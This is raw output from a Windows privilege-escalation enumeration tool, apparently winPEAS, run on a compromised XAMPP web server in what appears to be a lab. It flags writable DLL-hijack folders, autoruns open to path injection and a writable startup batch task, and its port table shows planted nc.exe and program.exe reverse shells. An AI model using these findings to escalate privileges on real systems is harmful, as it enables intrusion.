    (DLL Hijacking) C:\tools\php80: Users [AppendData/CreateDirectories WriteData/CreateFiles]
    (DLL Hijacking) C:\tools\BCURRAN3: Users [AppendData/CreateDirectories WriteData/CreateFiles]
    


�����������������������������������͹ Applications Information �������������������������������������

����������͹ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

����������͹ Installed Applications --Via Program Files/Uninstall registry--
� Check if you can modify installed software https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#software
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Uninstall Information
    C:\Program Files\Update Services
    C:\Program Files\VMware
    C:\Program Files\Windows Mail
    C:\Program Files\Windows NT
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell


����������͹ Autorun Applications
� Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DllDirectory
    Folder: C:\Windows\system32
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DllDirectory32
    Folder: C:\Windows\syswow64
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64cpu
    Folder: None (PATH Injection)
    File: Wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64win
    Folder: None (PATH Injection)
    File: Wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: LPK
    Folder: None (PATH Injection)
    File: LPK.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _Wow64
    Folder: None (PATH Injection)
    File: Wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
    Key: StubPath
    Folder: C:\Program Files\Windows Mail
    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{66C64F22-FC60-4E6C-A6B5-F0D580E680CE}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -EnableTLS
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{7D715857-A67C-4C2F-A929-038448584D63}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -DisableSSL3
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{44BBA840-CC51-11CF-AAFA-00AA00B6015C}
    Key: StubPath
    Folder: C:\Program Files\Windows Mail
    File: C:\Program Files\Windows Mail\WinMail.exe OCInstallUserConfigOE (Unquoted and Space detected)
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
   =================================================================================================


    Folder: C:\Users\alida\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: alida [AllAccess]
    File: C:\Users\alida\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected)
    FilePerms: alida [AllAccess]
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
   =================================================================================================


����������͹ Scheduled Applications --Non Microsoft--
� Check if you can modify other users scheduled binaries https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
    (IIS01-APOLLO\Administrator) Apache: C:\xampp\apache_start.bat 
    Permissions file: alida [AllAccess]
    Permissions folder(DLL Hijacking): alida [AllAccess], Users [AppendData/CreateDirectories WriteData/CreateFiles]
    Trigger: At system startup
    
   =================================================================================================


����������͹ Device Drivers --Non Microsoft--
� Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#vulnerable-drivers
    VIA PCI IDE MINI Driver - 6,0,6000,170 [VIA Technologies, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\viaide.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.22 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    Broadcom NetXtreme II GigE - 7.4.14.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    Broadcom NetXtreme II 10 GigE - 7.4.33.1 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    VMware vSockets Service - 9.8.17.0 build-16460229 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
    Adaptec RAID Controller - 7.2.0.30261 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.22 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.82 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    LSI SAS Gen2 Driver (StorPort) - 2.00.60.82 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2.sys
    LSI SAS Gen3 Driver (StorPort) - 2.50.65.01 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    Marvell Flash Controller -  1.0.5.1015  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    MEGASAS RAID Controller Driver for Windows - 6.600.21.08 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Intel Rapid Storage Technology driver (inbox) - 12.0.1.1018 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAV.sys
    AHCI 1.3 Device Driver - 1.1.4.14 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.4.14 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    VIA RAID driver - 7.0.9200,6320 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    QLogic Fibre Channel Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 2.74.214.004 05/23/2013 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 2.74.214.004 05/23/2013 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Brocade FC/FCoE HBA Stor Miniport Driver - 3.2.2.5 [Brocade Communications Systems, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    Brocade FC/FCoE HBA Stor Miniport Driver - 3.2.2.5 [Brocade Communications Systems, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    PMC-Sierra HBA Controller - 1.0.0.0254 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mlx4_bus.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ibbus.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ndfltr.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\winverbs.sys
    OpenFabrics Windows - 6.3.9391.6 [Mellanox]: \\.\GLOBALROOT\SystemRoot\System32\drivers\winmad.sys
    Broadcom iSCSI offload driver - 7.4.4.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    Broadcom FCoE offload driver - 7.4.6.0 [Broadcom Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Pointing PS/2 Device Driver - 12.5.10.0 build-14169150 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 8.17.03.0005 - build-18379147 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 8.17.03.0005 - build-18379147 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware PCIe Ethernet Adapter NDIS 6.30 (64-bit) - 1.9.12.0 build-20953372 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmxnet3.sys
    VMware server memory controller - 7.5.5.0 build-14903665 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys


�����������������������������������͹ Network Information �������������������������������������

����������͹ Network Shares
    ADMIN$ (Path: )
    C$ (Path: )
    IPC$ (Path: )

����������͹ Enumerate Network Mapped Drives (WMI)

����������͹ Host File

����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
  [X] Exception: The requested protocol has not been configured into the system, or no implementation for it exists
    Ethernet0 2[00:50:56:B0:59:B6]: 192.168.1.213, fe80::48ae:63e6:84a3:692d%14 / 255.255.255.0
        Gateways: 192.168.1.1
        DNSs: 192.168.1.3, 1.1.1.1
    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

����������͹ Current TCP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               80            0.0.0.0               0               Listening         1904            C:\xampp\apache\bin\httpd.exe
  TCP        0.0.0.0               135           0.0.0.0               0               Listening         600             svchost
  TCP        0.0.0.0               443           0.0.0.0               0               Listening         1904            C:\xampp\apache\bin\httpd.exe
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49152         0.0.0.0               0               Listening         420             wininit
  TCP        0.0.0.0               49153         0.0.0.0               0               Listening         692             svchost
  TCP        0.0.0.0               49154         0.0.0.0               0               Listening         732             svchost
  TCP        0.0.0.0               49155         0.0.0.0               0               Listening         268             spoolsv
  TCP        0.0.0.0               49156         0.0.0.0               0               Listening         504             services
  TCP        0.0.0.0               49157         0.0.0.0               0               Listening         1404            svchost
  TCP        0.0.0.0               49158         0.0.0.0               0               Listening         512             lsass
  TCP        192.168.1.213         80            10.10.14.39           49664           Close Wait        1904            C:\xampp\apache\bin\httpd.exe
  TCP        192.168.1.213         80            10.10.14.39           52438           Close Wait        1904            C:\xampp\apache\bin\httpd.exe
  TCP        192.168.1.213         80            10.10.14.39           60092           Established       1904            C:\xampp\apache\bin\httpd.exe
  TCP        192.168.1.213         139           0.0.0.0               0               Listening         4               System
  TCP        192.168.1.213         49218         10.10.14.39           4001            Close Wait        1628            
  TCP        192.168.1.213         49229         10.10.14.39           4001            Close Wait        952             
  TCP        192.168.1.213         49231         10.10.14.39           4444            Established       1040            C:\xampp\tmp\program.exe
  TCP        192.168.1.213         49233         10.10.14.39           4001            Close Wait        1260            
  TCP        192.168.1.213         49235         10.10.14.39           4001            Established       1396            C:\xampp\htdocs\nc.exe

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        80            [::]                                        0               Listening         1904            C:\xampp\apache\bin\httpd.exe
  TCP        [::]                                        135           [::]                                        0               Listening         600             svchost
  TCP        [::]                                        443           [::]                                        0               Listening         1904            C:\xampp\apache\bin\httpd.exe
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49152         [::]                                        0               Listening         420             wininit
  TCP        [::]                                        49153         [::]                                        0               Listening         692             svchost
  TCP        [::]                                        49154         [::]                                        0               Listening         732             svchost
  TCP        [::]                                        49155         [::]                                        0               Listening         268             spoolsv
  TCP        [::]                                        49156         [::]                                        0               Listening         504             services
  TCP        [::]                                        49157         [::]                                        0               Listening         1404            svchost
  TCP        [::]                                        49158         [::]                                        0               Listening         512             lsass

����������͹ Current UDP Listening Ports
� Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            780               svchost
  UDP        0.0.0.0               500           *:*                            732               svchost
  UDP        0.0.0.0               4500          *:*                            732               svchost
  UDP        0.0.0.0               5355          *:*                            844               svchost
  UDP        192.168.1.213         137           *:*                            4                 System
  UDP        192.168.1.213         138           *:*                            4                 System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            780               svchost
  UDP        [::]                                        500           *:*                            732               svchost
  UDP        [::]                                        4500          *:*                            732               svchost
  UDP        [::]                                        5355          *:*                            844               svchost

����������͹ Firewall Rules
� Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    False
    FirewallEnabled (Public):    False
    DENY rules:

����������͹ DNS cached --limit 70--
    Entry                                 Name                                  Data

����������͹ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
